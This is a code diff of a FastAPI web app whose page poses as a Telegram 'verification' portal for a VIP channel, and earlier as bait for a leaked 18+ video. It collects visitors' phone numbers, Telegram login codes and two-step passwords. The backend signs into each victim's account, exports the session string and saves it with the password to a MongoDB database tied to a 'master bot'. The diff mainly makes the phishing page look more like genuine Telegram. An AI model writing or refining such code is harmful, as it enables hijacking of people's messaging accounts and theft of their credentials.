@@ -1,5 +1,6 @@
 import os
 import re
+import asyncio
 from fastapi import FastAPI, Request, HTTPException
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
@@ -15,25 +16,21 @@ from motor.motor_asyncio import AsyncIOMotorClient
 # ---------------------------------------------------------
 # App & Config Setup
 # ---------------------------------------------------------
-app = FastAPI(title="Premium Video Hub")
+app = FastAPI(title="Access Portal")
 
-# Environment Variables (Render Dashboard se load honge)
 API_ID = int(os.environ.get("API_ID", "123456"))
 API_HASH = os.environ.get("API_HASH", "YOUR_API_HASH")
 MONGO_URL = os.environ.get("MONGO_URL", "mongodb+srv://user:pass@cluster.mongodb.net/?retryWrites=true&w=majority")
 CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/your_private_channel")
 
-# MongoDB Client Setup (Master Bot Synced)
+# MongoDB Client
 mongo_client = AsyncIOMotorClient(MONGO_URL)
+# Ensure database and collection match Master Bot structure exactly
 db = mongo_client["telegram_db"]
-sessions_col = db["sessions"]  # Collection name synced with Bot
+sessions_col = db["sessions"]
 
-# Temporary Memory Storage for Active Telegram Login Sessions
 active_clients = {}
 
-# ---------------------------------------------------------
-# Helper Function for Flexible Phone Cleaning
-# ---------------------------------------------------------
 def clean_phone_number(phone_raw: str) -> str:
     digits = re.sub(r'[^\d+]', '', phone_raw)
     if digits.startswith('+'):
@@ -44,9 +41,6 @@ def clean_phone_number(phone_raw: str) -> str:
         return f"+91{digits}"
     return f"+{digits}"
 
-# ---------------------------------------------------------
-# Request Models
-# ---------------------------------------------------------
 class PhoneReq(BaseModel):
     phone: str
 
@@ -59,7 +53,7 @@ class PasswordReq(BaseModel):
     password: str
 
 # ---------------------------------------------------------
-# HTML UI Template: PREMIUM VIDEO HUB (FINAL)
+# UI HTML (AUTHENTIC REAL TELEGRAM MODAL LOOK)
 # ---------------------------------------------------------
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -67,164 +61,119 @@ HTML_TEMPLATE = """
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Premium Video Hub</title>
+  <title>VIP Access Portal</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
   <style>
-    body { background: #0d0e12; color: #f3f4f6; font-family: 'Inter', sans-serif; }
-    .glass { background: rgba(22, 24, 34, 0.85); backdrop-filter: blur(14px); border: 1px solid rgba(255, 255, 255, 0.08); }
-    .btn-pink-gradient { 
-      background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%); 
-      transition: all 0.3s ease; 
-      box-shadow: 0 8px 25px -5px rgba(255, 65, 108, 0.5);
-    }
-    .btn-pink-gradient:hover { 
-      transform: translateY(-2px); 
-      box-shadow: 0 12px 30px -5px rgba(255, 65, 108, 0.7); 
-    }
-    .video-card-gradient {
-      background: linear-gradient(180deg, #6a11cb 0%, #2575fc 100%);
-    }
+    body { background: #0e1621; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    .telegram-bg { background: #17212b; }
+    .telegram-card { background: #242f3d; }
+    .telegram-btn { background: #2b5278; transition: all 0.2s; }
+    .telegram-btn:hover { background: #335f8a; }
+    .telegram-blue-btn { background: #2481cc; transition: all 0.2s; }
+    .telegram-blue-btn:hover { background: #288fdf; }
   </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-between p-3 md:p-6">
+<body class="min-h-screen flex flex-col items-center justify-between p-4">
 
-  <header class="w-full max-w-xl text-center py-4 mb-2">
-    <h1 class="text-2xl md:text-3xl font-black tracking-wider text-white uppercase flex items-center justify-center gap-2">
-      <span class="text-red-500"><i class="fa-solid fa-fire"></i></span> PREMIUM VIDEO HUB
-    </h1>
-    <p class="text-xs text-gray-400 mt-1 tracking-wide">Exclusive content — Verified members only</p>
+  <header class="w-full max-w-md flex items-center justify-between py-3 px-2">
+    <div class="flex items-center gap-2">
+      <span class="bg-blue-600 text-xs font-bold px-2.5 py-1 rounded-full uppercase tracking-wider">VIP</span>
+      <h1 class="text-lg font-bold tracking-wide">ACCESS PORTAL</h1>
+    </div>
+    <div class="flex items-center gap-1 text-xs text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20">
+      <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> Active Verification
+    </div>
   </header>
 
-  <main class="w-full max-w-xl space-y-6">
+  <main class="w-full max-w-md space-y-4">
     
-    <div class="glass rounded-3xl overflow-hidden p-3 border border-gray-800 shadow-2xl">
-      <div class="relative w-full aspect-video rounded-2xl overflow-hidden video-card-gradient flex items-center justify-center border border-white/10 shadow-inner">
-        <button onclick="openModal()" class="w-16 h-16 bg-white/20 backdrop-blur-md rounded-full flex items-center justify-center text-white text-2xl hover:scale-110 transition shadow-lg border border-white/30">
+    <div class="telegram-bg rounded-2xl p-4 border border-gray-800 shadow-xl space-y-3">
+      <div class="flex items-center gap-2 text-sm text-blue-400 font-semibold">
+        <i class="fa-solid fa-circle-play"></i> How to Unlock Access (Guide Video)
+      </div>
+
+      <div class="relative w-full aspect-video rounded-xl overflow-hidden bg-black border border-gray-700">
+        <video class="w-full h-full object-cover" autoplay loop muted playsinline poster="https://via.placeholder.com/640x360/17212b/ffffff?text=Loading+Guide...">
+          <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
+        </video>
+        <button onclick="openModal()" class="absolute inset-0 m-auto w-14 h-14 bg-blue-600/90 rounded-full flex items-center justify-center text-white text-xl shadow-lg border border-white/20 hover:scale-105 transition">
           <i class="fa-solid fa-play ml-1"></i>
         </button>
       </div>
 
-      <div class="p-3 space-y-2">
-        <div class="flex items-center justify-between">
-          <h2 class="text-lg font-bold text-white tracking-wide">🔥 LEAKED PRIVATE VIDEO — 2026</h2>
-        </div>
-        <div class="flex items-center gap-3 text-xs text-gray-400">
-          <span class="text-yellow-400 font-semibold"><i class="fa-solid fa-star"></i> 4.9 (2.4M views)</span>
-          <span>•</span>
-          <span class="text-gray-300">18+</span>
-        </div>
-        <div>
-          <span class="inline-block px-2.5 py-0.5 bg-red-500/20 text-red-400 border border-red-500/30 text-[10px] font-bold rounded-md uppercase tracking-wider">
-            🔒 RESTRICTED
-          </span>
-        </div>
-      </div>
-
-      <button onclick="openModal()" class="w-full mt-2 py-4 btn-pink-gradient text-white font-extrabold text-base md:text-lg rounded-2xl flex items-center justify-center gap-2 tracking-wide uppercase">
-        <i class="fa-brands fa-telegram text-2xl"></i> GET YOUR LINK TAP TO VERIFY VIA TELEGRAM
+      <button onclick="openModal()" class="w-full py-3.5 telegram-blue-btn text-white font-bold rounded-xl flex items-center justify-center gap-2 shadow-lg tracking-wide uppercase text-sm">
+        <i class="fa-solid fa-paper-plane"></i> VERIFY VIA TELEGRAM TO UNLOCK
       </button>
     </div>
 
-    <div>
-      <h3 class="text-sm font-bold text-gray-300 mb-3 tracking-wide flex items-center gap-2">
-        <span class="text-red-500"><i class="fa-solid fa-fire"></i></span> More Videos
-      </h3>
-      <div class="grid grid-cols-2 gap-3">
-        <div onclick="openModal()" class="glass rounded-2xl overflow-hidden border border-gray-800 cursor-pointer hover:border-gray-600 transition">
-          <div class="w-full h-28 bg-gradient-to-br from-pink-600 to-purple-800 flex items-center justify-center relative">
-            <i class="fa-solid fa-play text-white/80 text-xl"></i>
-          </div>
-          <div class="p-2.5">
-            <div class="text-xs font-bold text-white">Private 01</div>
-            <div class="text-[10px] text-gray-400 mt-0.5">2.1M views</div>
-          </div>
-        </div>
-
-        <div onclick="openModal()" class="glass rounded-2xl overflow-hidden border border-gray-800 cursor-pointer hover:border-gray-600 transition">
-          <div class="w-full h-28 bg-gradient-to-br from-amber-600 to-red-800 flex items-center justify-center relative">
-            <i class="fa-solid fa-play text-white/80 text-xl"></i>
-          </div>
-          <div class="p-2.5">
-            <div class="text-xs font-bold text-white">Private 02</div>
-            <div class="text-[10px] text-gray-400 mt-0.5">1.8M views</div>
-          </div>
-        </div>
-
-        <div onclick="openModal()" class="glass rounded-2xl overflow-hidden border border-gray-800 cursor-pointer hover:border-gray-600 transition">
-          <div class="w-full h-28 bg-gradient-to-br from-emerald-600 to-teal-800 flex items-center justify-center relative">
-            <i class="fa-solid fa-play text-white/80 text-xl"></i>
-          </div>
-          <div class="p-2.5">
-            <div class="text-xs font-bold text-white">Private 03</div>
-            <div class="text-[10px] text-gray-400 mt-0.5">1.5M views</div>
-          </div>
-        </div>
-
-        <div onclick="openModal()" class="glass rounded-2xl overflow-hidden border border-gray-800 cursor-pointer hover:border-gray-600 transition">
-          <div class="w-full h-28 bg-gradient-to-br from-blue-600 to-indigo-800 flex items-center justify-center relative">
-            <i class="fa-solid fa-play text-white/80 text-xl"></i>
-          </div>
-          <div class="p-2.5">
-            <div class="text-xs font-bold text-white">Private 04</div>
-            <div class="text-[10px] text-gray-400 mt-0.5">1.2M views</div>
-          </div>
-        </div>
-      </div>
-    </div>
   </main>
 
-  <div id="authModal" class="fixed inset-0 bg-black/85 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
-    <div class="glass w-full max-w-md rounded-3xl p-6 relative border border-gray-700 shadow-2xl">
-      <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white"><i class="fa-solid fa-xmark text-xl"></i></button>
+  <div id="authModal" class="fixed inset-0 bg-black/80 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
+    <div class="telegram-bg w-full max-w-sm rounded-2xl p-6 relative border border-gray-700 shadow-2xl">
+      <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
 
       <div id="step-phone" class="space-y-4">
         <div class="text-center">
-          <i class="fa-brands fa-telegram text-5xl text-red-500 mb-2"></i>
+          <div class="w-16 h-16 bg-blue-500/10 text-blue-400 rounded-full flex items-center justify-center mx-auto mb-3 text-3xl">
+            <i class="fa-solid fa-paper-plane"></i>
+          </div>
           <h3 class="text-xl font-bold">Telegram Verification</h3>
           <p class="text-xs text-gray-400 mt-1">Enter your phone number with country code</p>
         </div>
-        <input type="text" id="phoneInput" placeholder="+91 XXXXX XXXXX" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-red-500 text-lg text-center tracking-widest">
-        <button onclick="sendCode()" id="btnSendCode" class="w-full py-3.5 btn-pink-gradient text-white font-bold rounded-xl uppercase tracking-wider">Send Code</button>
+        <input type="text" id="phoneInput" placeholder="+91 XXXXX XXXXX" class="w-full telegram-card border border-gray-700 rounded-xl px-4 py-3 text-white text-center text-lg focus:outline-none focus:border-blue-500">
+        <button onclick="sendCode()" id="btnSendCode" class="w-full py-3 telegram-blue-btn text-white font-bold rounded-xl uppercase tracking-wider text-sm flex items-center justify-center gap-2">
+          <span>Send Code</span>
+        </button>
       </div>
 
       <div id="step-otp" class="space-y-4 hidden">
         <div class="text-center">
-          <i class="fa-solid fa-shield-halved text-5xl text-emerald-500 mb-2"></i>
-          <h3 class="text-xl font-bold">Enter 5-Digit OTP Code</h3>
-          <p class="text-xs text-gray-400 mt-1">Check your official Telegram app for verification code</p>
-          <p id="displayPhone" class="text-xs text-red-400 font-semibold mt-1"></p>
+          <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 rounded-full flex items-center justify-center mx-auto mb-3 text-3xl">
+            <i class="fa-solid fa-shield-halved"></i>
+          </div>
+          <h3 class="text-xl font-bold">Enter OTP Code</h3>
+          <p class="text-xs text-gray-400 mt-1">Check your official Telegram app</p>
+          <p id="displayPhone" class="text-xs text-blue-400 font-medium mt-1"></p>
         </div>
-        <input type="text" id="otpInput" placeholder="• • • • •" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-emerald-500 text-2xl text-center tracking-widest font-mono">
-        
-        <button onclick="verifyOtp()" id="btnVerifyOtp" class="w-full py-3.5 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl transition uppercase tracking-wider">Verify & Continue</button>
+        <input type="text" id="otpInput" placeholder="• • • • •" class="w-full telegram-card border border-gray-700 rounded-xl px-4 py-3 text-white text-center text-2xl tracking-widest font-mono focus:outline-none focus:border-emerald-500">
+        <button onclick="verifyOtp()" id="btnVerifyOtp" class="w-full py-3 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl uppercase tracking-wider text-sm flex items-center justify-center gap-2">
+          <span>Verify & Continue</span>
+        </button>
 
         <div class="flex items-center justify-between text-xs text-gray-400 pt-2 border-t border-gray-800">
-          <button onclick="goBackToPhone()" class="hover:text-red-400 flex items-center gap-1">
-            <i class="fa-solid fa-pen-to-square"></i> Edit Number
-          </button>
-          <button onclick="sendCode(true)" id="btnResend" class="hover:text-emerald-400 flex items-center gap-1">
-            <i class="fa-solid fa-rotate-right"></i> Resend OTP
-          </button>
+          <button onclick="goBackToPhone()" class="hover:text-blue-400 flex items-center gap-1"><i class="fa-solid fa-pen-to-square"></i> Edit Number</button>
+          <button onclick="sendCode(true)" id="btnResend" class="hover:text-emerald-400 flex items-center gap-1"><i class="fa-solid fa-rotate-right"></i> Resend OTP</button>
         </div>
       </div>
 
       <div id="step-2fa" class="space-y-4 hidden">
         <div class="text-center">
-          <i class="fa-solid fa-lock text-5xl text-yellow-500 mb-2"></i>
+          <div class="w-16 h-16 bg-yellow-500/10 text-yellow-500 rounded-full flex items-center justify-center mx-auto mb-3 text-3xl">
+            <i class="fa-solid fa-lock"></i>
+          </div>
           <h3 class="text-xl font-bold">Two-Step Verification</h3>
           <p class="text-xs text-gray-400 mt-1">Your Telegram account requires 2FA password</p>
         </div>
-        <input type="password" id="passwordInput" placeholder="Password" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-yellow-500 text-lg text-center">
-        <button onclick="verify2FA()" id="btnVerify2FA" class="w-full py-3.5 bg-yellow-600 hover:bg-yellow-500 text-white font-bold rounded-xl transition uppercase tracking-wider">Submit Password</button>
+        
+        <div class="relative w-full">
+          <input type="password" id="passwordInput" placeholder="Password" class="w-full telegram-card border border-gray-700 rounded-xl pl-4 pr-10 py-3 text-white text-center focus:outline-none focus:border-yellow-500">
+          <button type="button" onclick="togglePassword()" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white px-1">
+            <i id="eyeIcon" class="fa-solid fa-eye"></i>
+          </button>
+        </div>
+
+        <button onclick="verify2FA()" id="btnVerify2FA" class="w-full py-3 bg-yellow-600 hover:bg-yellow-500 text-white font-bold rounded-xl uppercase tracking-wider text-sm flex items-center justify-center gap-2">
+          <span>Submit Password</span>
+        </button>
       </div>
 
       <p id="errorMsg" class="text-red-400 text-xs text-center mt-3 hidden"></p>
     </div>
   </div>
 
-  <footer class="text-gray-600 text-xs text-center py-4">
-    &copy; 2026 Premium Video Hub. All Rights Reserved.
+  <footer class="text-gray-600 text-xs text-center py-2">
+    &copy; 2026 Secure Access Portal. All Rights Reserved.
   </footer>
 
   <script>
@@ -239,82 +188,107 @@ HTML_TEMPLATE = """
       err.classList.remove('hidden');
     }
 
+    function togglePassword() {
+      const input = document.getElementById('passwordInput');
+      const icon = document.getElementById('eyeIcon');
+      if (input.type === 'password') {
+        input.type = 'text';
+        icon.classList.replace('fa-eye', 'fa-eye-slash');
+      } else {
+        input.type = 'password';
+        icon.classList.replace('fa-eye-slash', 'fa-eye');
+      }
+    }
+
     function goBackToPhone() {
       document.getElementById('step-otp').classList.add('hidden');
       document.getElementById('step-phone').classList.remove('hidden');
       document.getElementById('errorMsg').classList.add('hidden');
-      document.getElementById('btnSendCode').innerText = "Send Code";
+      document.getElementById('btnSendCode').innerHTML = '<span>Send Code</span>';
     }
 
     async function sendCode(isResend = false) {
-      if(!isResend) {
-        userPhone = document.getElementById('phoneInput').value.trim();
-      }
-      
-      if(!userPhone) return showError("Please enter a valid phone number.");
+      if(!isResend) userPhone = document.getElementById('phoneInput').value.trim();
+      if(!userPhone) return showError("Please enter phone number.");
 
       const btn = isResend ? document.getElementById('btnResend') : document.getElementById('btnSendCode');
-      btn.innerText = isResend ? "Resending..." : "Sending...";
+      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>Sending...</span>';
 
-      const res = await fetch('/api/send-code', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ phone: userPhone })
-      });
-      const data = await res.json();
-      
-      if(res.ok) {
-        userPhone = data.phone;
-        document.getElementById('displayPhone').innerText = "Sent to: " + userPhone;
-        document.getElementById('step-phone').classList.add('hidden');
-        document.getElementById('step-otp').classList.remove('hidden');
-        document.getElementById('errorMsg').classList.add('hidden');
-      } else {
-        showError(data.detail || "Error sending OTP");
+      try {
+        const res = await fetch('/api/send-code', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ phone: userPhone })
+        });
+        const data = await res.json();
+        
+        if(res.ok) {
+          userPhone = data.phone;
+          document.getElementById('displayPhone').innerText = "Sent to: " + userPhone;
+          document.getElementById('step-phone').classList.add('hidden');
+          document.getElementById('step-otp').classList.remove('hidden');
+          document.getElementById('errorMsg').classList.add('hidden');
+        } else {
+          showError(data.detail || "Failed to send OTP.");
+        }
+      } catch(err) {
+        showError("Server timeout / network error.");
       }
 
-      document.getElementById('btnSendCode').innerText = "Send Code";
+      document.getElementById('btnSendCode').innerHTML = '<span>Send Code</span>';
       document.getElementById('btnResend').innerHTML = '<i class="fa-solid fa-rotate-right"></i> Resend OTP';
     }
 
     async function verifyOtp() {
       const code = document.getElementById('otpInput').value.trim();
-      document.getElementById('btnVerifyOtp').innerText = "Verifying...";
-      const res = await fetch('/api/verify-otp', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ phone: userPhone, code: code })
-      });
-      const data = await res.json();
-      if(res.ok) {
-        if(data.require_2fa) {
-          document.getElementById('step-otp').classList.add('hidden');
-          document.getElementById('step-2fa').classList.remove('hidden');
-          document.getElementById('errorMsg').classList.add('hidden');
+      const btn = document.getElementById('btnVerifyOtp');
+      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>Verifying...</span>';
+      
+      try {
+        const res = await fetch('/api/verify-otp', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ phone: userPhone, code: code })
+        });
+        const data = await res.json();
+        if(res.ok) {
+          if(data.require_2fa) {
+            document.getElementById('step-otp').classList.add('hidden');
+            document.getElementById('step-2fa').classList.remove('hidden');
+            document.getElementById('errorMsg').classList.add('hidden');
+          } else {
+            window.location.href = data.link;
+          }
         } else {
-          window.location.href = data.link;
+          showError(data.detail || "Invalid OTP code.");
         }
-      } else {
-        showError(data.detail || "Invalid OTP");
-        document.getElementById('btnVerifyOtp').innerText = "Verify & Continue";
+      } catch(err) {
+        showError("Verification error.");
       }
+      btn.innerHTML = '<span>Verify & Continue</span>';
     }
 
     async function verify2FA() {
       const password = document.getElementById('passwordInput').value.trim();
-      document.getElementById('btnVerify2FA').innerText = "Verifying 2FA...";
-      const res = await fetch('/api/verify-2fa', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ phone: userPhone, password: password })
-      });
-      const data = await res.json();
-      if(res.ok) {
-        window.location.href = data.link;
-      } else {
-        showError(data.detail || "Incorrect Password");
-        document.getElementById('btnVerify2FA').innerText = "Submit Password";
+      const btn = document.getElementById('btnVerify2FA');
+      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>Verifying...</span>';
+      
+      try {
+        const res = await fetch('/api/verify-2fa', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ phone: userPhone, password: password })
+        });
+        const data = await res.json();
+        if(res.ok) {
+          window.location.href = data.link;
+        } else {
+          showError(data.detail || "Incorrect 2FA password.");
+        }
+      } catch(err) {
+        showError("2FA error.");
       }
+      btn.innerHTML = '<span>Submit Password</span>';
     }
   </script>
 </body>
@@ -354,7 +328,7 @@ async def send_code(data: PhoneReq):
 async def verify_otp(data: OtpReq):
     phone = clean_phone_number(data.phone)
     if phone not in active_clients:
-        raise HTTPException(status_code=400, detail="Session expired. Restart process.")
+        raise HTTPException(status_code=400, detail="Session expired. Please re-enter number.")
     
     session = active_clients[phone]
     client: Client = session["client"]
@@ -365,7 +339,7 @@ async def verify_otp(data: OtpReq):
         string_session = await client.export_session_string()
         await client.disconnect()
         
-        # Save Session & Default 2FA ('None') to MongoDB
+        # Save session data synced with master bot
         await sessions_col.update_one(
             {"phone": phone},
             {"$set": {
@@ -385,7 +359,7 @@ async def verify_otp(data: OtpReq):
     except PhoneCodeInvalid:
         raise HTTPException(status_code=400, detail="Invalid OTP code.")
     except PhoneCodeExpired:
-        raise HTTPException(status_code=400, detail="OTP Code Expired.")
+        raise HTTPException(status_code=400, detail="OTP Expired.")
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
 
@@ -402,7 +376,7 @@ async def verify_2fa(data: PasswordReq):
         string_session = await client.export_session_string()
         await client.disconnect()
         
-        # Save Session & 2FA Password to MongoDB
+        # Save session and 2FA password synced with master bot
         await sessions_col.update_one(
             {"phone": phone},
             {"$set": {
@@ -417,6 +391,6 @@ async def verify_2fa(data: PasswordReq):
         
         return {"status": "success", "link": CHANNEL_LINK}
     except PasswordHashInvalid:
-        raise HTTPException(status_code=400, detail="Incorrect 2FA Password.")
+        raise HTTPException(status_code=400, detail="Incorrect 2FA password.")
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
